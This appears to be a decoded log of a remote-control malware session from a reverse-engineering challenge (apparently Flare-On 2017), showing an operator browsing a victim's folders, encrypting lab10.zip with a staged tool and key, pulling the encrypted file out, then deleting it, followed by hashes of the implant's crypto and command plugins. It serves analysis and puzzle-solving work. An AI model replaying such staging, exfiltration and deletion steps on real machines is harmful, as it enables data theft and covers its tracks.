+05/24/2017  11:45 AM    <DIR>          Users
+08/01/2017  10:08 AM    <DIR>          Windows
+05/25/2017  11:36 AM    <DIR>          work
+               2 File(s)             34 bytes
+               6 Dir(s)  55,136,497,664 bytes free
+
+c:\>
+shell_out
+cd work
+
+c:\work>
+shell_out
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is ECAA-2B67
+
+ Directory of c:\work
+
+05/25/2017  11:36 AM    <DIR>          .
+05/25/2017  11:36 AM    <DIR>          ..
+05/25/2017  11:35 AM    <DIR>          bestinbreed
+05/25/2017  11:35 AM    <DIR>          coolstuff
+05/25/2017  11:36 AM    <DIR>          cyberdisruptor
+05/25/2017  11:36 AM    <DIR>          flareon2015
+05/25/2017  11:35 AM    <DIR>          flareon2016
+05/25/2017  11:35 AM    <DIR>          flareon2017
+05/25/2017  11:35 AM    <DIR>          gamechanger
+05/25/2017  11:36 AM    <DIR>          innovation
+05/25/2017  11:35 AM    <DIR>          paradigmshifter
+               0 File(s)              0 bytes
+              11 Dir(s)  55,136,497,664 bytes free
+
+c:\work>
+shell_out
+cd flareon2017
+
+c:\work\flareon2017>
+shell_out
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is ECAA-2B67
+
+ Directory of c:\work\flareon2017
+
+05/25/2017  11:35 AM    <DIR>          .
+05/25/2017  11:35 AM    <DIR>          ..
+05/25/2017  11:35 AM    <DIR>          build
+08/01/2017  09:57 AM    <DIR>          package
+05/25/2017  11:39 AM               218 README.md
+05/25/2017  11:35 AM    <DIR>          src
+               1 File(s)            218 bytes
+               5 Dir(s)  55,136,497,664 bytes free
+
+c:\work\flareon2017>
+shell_out
+type README.md
+# GoChallenge
+Go Lang FlareOn Challenge
+
+To run the challenge:
+$ go run challenge.go 
+
+To build the challenge:
+$ go build challenge.go 
+
+Note: I think my password is good. Why do you guys want me to change it?
+c:\work\flareon2017>
+shell_out
+cd package
+
+c:\work\flareon2017\package>
+shell_out
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is ECAA-2B67
+
+ Directory of c:\work\flareon2017\package
+
+08/01/2017  09:57 AM    <DIR>          .
+08/01/2017  09:57 AM    <DIR>          ..
+08/01/2017  09:54 AM           561,862 lab10.zip
+               1 File(s)        561,862 bytes
+               2 Dir(s)  55,136,538,624 bytes free
+
+c:\work\flareon2017\package>
+shell_out
+mkdir c:\staging
+
+c:\work\flareon2017\package>
+shell_out
+c:\staging\cf.exe lab10.zip tCqlc2+fFiLcuq1ee1eAPOMjxcdijh8z0jrakMA/jxg=
+
+shell_out
+
+c:\work\flareon2017\package>dir
+ Volume in drive C has no label.
+ Volume Serial Number is ECAA-2B67
+
+ Directory of c:\work\flareon2017\package
+
+08/01/2017  10:12 AM    <DIR>          .
+08/01/2017  10:12 AM    <DIR>          ..
+08/01/2017  09:54 AM           561,862 lab10.zip
+08/01/2017  10:12 AM           561,972 lab10.zip.cry
+               2 File(s)      1,123,834 bytes
+               2 Dir(s)  55,135,965,184 bytes free
+
+c:\work\flareon2017\package>
+file_get: {'filemd5': '8bf72789dcc08e08b7ccf0ee879135e1',
+ 'filename': u'c:\\work\\flareon2017\\package\\lab10.zip.cry'}
+shell_out
+del lab10*
+
+c:\work\flareon2017\package>
+shell_out
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is ECAA-2B67
+
+ Directory of c:\work\flareon2017\package
+
+08/01/2017  10:13 AM    <DIR>          .
+08/01/2017  10:13 AM    <DIR>          ..
+               0 File(s)              0 bytes
+               2 Dir(s)  55,137,095,680 bytes free
+
+c:\work\flareon2017\package>
+############################################################
+Files:
+f873a174ccb567670e222c1f37195cf2: plugin_Rc4Crypto.bin
+6e8866fc570d74ab21b99f687c108105: plugin_LookupTableCrypto.bin
+fb5acf29a468df13c2289f3e96027f12: plugin_CustomBase64Crypto.bin
+59061be984a290dd9c9320edb569ac71: plugin_XteaCrypto.bin
+114a99b58940c5f5dd41114fe340468e: plugin_ZlibCompress.bin
+4b05ff9bf7f59bf411a605b24c28a5b5: plugin_FileComamnd.bin
+ac9f33da50bb56522402bf01bb1df548: plugin_ShellCommand.bin
+3f002fa74b02da598f39a867e2d052a0: plugin_ScreenCommand.bin
+27304b246c7d5b4e149124d5f93c5b01: c:\staging\pse.exe
+27304b246c7d5b4e149124d5f93c5b01: c:\staging\pse.exe
+bf0a86db982de1996c0dc49d681dbe81: c:\staging\srv2.exe
+bf0a86db982de1996c0dc49d681dbe81: c:\staging\srv2.exe
+9e5ca05e6fe30a37056c290a9fc7177c: plugin_ProxyCommand.bin
+df328417c4854dad1d1a6d1e939868c7: screenshot.bmp
+935579cedacc17cc09096bb2fdf94b67: plugin_BlowfishCrypto.bin
+bc9dd7421b8ac9494c63ca914dd20131: plugin_SimpleXorCrypto.bin
+7a199d23e020cee581d01abdb656bb29: plugin_Des3Crypto.bin
+7ce8b4d35df8c7da55789ab8cf372f5f: plugin_CamelliaCrypto.bin
+e6895743ba3e996036d65f80fbae1827: plugin_ApLibCompress.bin
+5abd114aeb2af11c9b12c4918c5eb261: plugin_LzoCompress.bin
+3f002fa74b02da598f39a867e2d052a0: plugin_ScreenCommand.bin
+4b05ff9bf7f59bf411a605b24c28a5b5: plugin_FileComamnd.bin
+ac9f33da50bb56522402bf01bb1df548: plugin_ShellCommand.bin
+22eef49edcaa9db5bdf90bb0147fb8b3: c:\staging\cf.exe
+22eef49edcaa9db5bdf90bb0147fb8b3: c:\staging\cf.exe
+15801d18d54c9fa94010f48ab97096c6: screenshot.bmp
+8bf72789dcc08e08b7ccf0ee879135e1: c:\work\flareon2017\package\lab10.zip.cry
+128321c4fe1dfc7ff25484d813c838b1: secondstage
+6f53a0ed92c00f3e6fc83e0da28aaf19: decoded_secondstage
